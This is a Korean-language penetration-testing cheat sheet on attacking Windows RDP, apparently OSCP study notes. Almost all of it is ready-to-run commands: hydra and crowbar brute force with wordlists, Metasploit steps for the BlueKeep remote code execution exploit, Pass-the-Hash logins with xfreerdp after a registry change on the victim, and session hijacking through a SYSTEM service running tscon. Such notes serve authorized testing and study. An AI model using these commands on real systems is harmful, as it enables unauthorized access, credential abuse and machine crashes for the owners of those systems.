# RDP

# RDP (3389)

Windows 원격 데스크탑 프로토콜. 자격증명 브루트포스, BlueKeep 등 취약점, Pass-the-Hash가 주요 공격 벡터.

---

## 1. 열거

```bash
# nmap
nmap -p 3389 --script=rdp-enum-encryption <IP>
nmap -sV -p 3389 <IP>

# netexec
nxc rdp <IP>
nxc rdp <서브넷>/24
```

---

## 2. 접속

```bash
# xfreerdp (칼리 기본)
xfreerdp /v:<IP> /u:administrator /p:'password'
xfreerdp /v:<IP> /u:administrator /p:'password' /d:CORP
xfreerdp /v:<IP> /u:administrator /p:'password' /cert:ignore

# 해상도 지정
xfreerdp /v:<IP> /u:administrator /p:'password' /cert:ignore /w:1280 /h:800

# 해시로 접속 (Pass-the-Hash, Restricted Admin Mode 필요)
xfreerdp /v:<IP> /u:administrator /pth:<NTLM> /cert:ignore
xfreerdp /v:<IP> /u:administrator /pth:aad3b435b51404eeaad3b435b51404ee:<NTLM> /cert:ignore

# rdesktop
rdesktop <IP> -u administrator -p password

# Remmina (GUI)
remmina &
```

---

## 3. 브루트포스

```bash
# hydra
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<IP>
hydra -L users.txt -P passwords.txt rdp://<IP> -t 4

# netexec
nxc rdp <IP> -u users.txt -p passwords.txt --continue-on-success
nxc rdp <IP> -u administrator -p 'password'

# crowbar
crowbar -b rdp -s <IP>/32 -u administrator -C passwords.txt
```

---

## 4. BlueKeep (CVE-2019-0708)

Windows 7, Server 2008 R2 이하에서 인증 없이 원격 코드 실행.

```bash
# Metasploit으로 탐지
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <IP>
run
# → VULNERABLE 출력 시 취약

# 익스플로잇 (불안정, 프로덕션 환경에서는 BSOD 유발 가능)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <IP>
set LHOST <칼리IP>
set target 2    # 타겟 OS 버전 맞게 설정 (show targets로 확인)
exploit

# 수동 탐지 (nmap — 공식 스크립트 없음, 버전으로 추정)
nmap -sV -p 3389 <IP>
# Windows 7 SP1 / Server 2008 R2 + 3389 열려있으면 의심
```

---

## 5. DejaBlue (CVE-2019-1181 / CVE-2019-1182)

Windows 8, 10, Server 2012~2019에도 영향. BlueKeep과 유사한 RDP 취약점.

```bash
# Metasploit 탐지 (익스플로잇 모듈은 공개되지 않음)
use auxiliary/scanner/rdp/cve_2019_1181_dejablue
set RHOSTS <IP>
run

# searchsploit
searchsploit CVE-2019-1181
searchsploit DejaBlue
```

---

## 6. Pass-the-Hash (Restricted Admin Mode)

```bash
# Restricted Admin Mode 활성화 확인 (피해자에서)
reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin
# 값이 0 또는 키 없음 = 활성화됨

# 비활성화 상태면 활성화 (관리자 권한 필요)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0

# PtH로 RDP 접속
xfreerdp /v:<IP> /u:administrator /pth:<NTLM> /cert:ignore
```

---

## 7. 세션 하이재킹 (로컬 관리자 권한 있을 때)

```bash
:: 현재 세션 목록
query user

:: 다른 사용자 세션으로 전환
tscon <세션ID> /dest:console

:: SYSTEM 권한으로 패스워드 없이 전환(서비스 생성 경유)
sc create rdphijack binPath= "cmd.exe /k tscon <세션ID> /dest:rdp-tcp#<세션번호>"
sc start rdphijack
sc delete rdphijack
```

---

## 팁

- 3389 외 다른 포트로 변경된 경우 있음 → `nmap -p-` 로 확인
- NLA (Network Level Authentication) 활성화 시 자격증명 먼저 필요
- `xfreerdp /cert:ignore` 로 인증서 오류 무시
- BlueKeep은 불안정해서 BSOD 유발 가능 → OSCP에서 주의해서 사용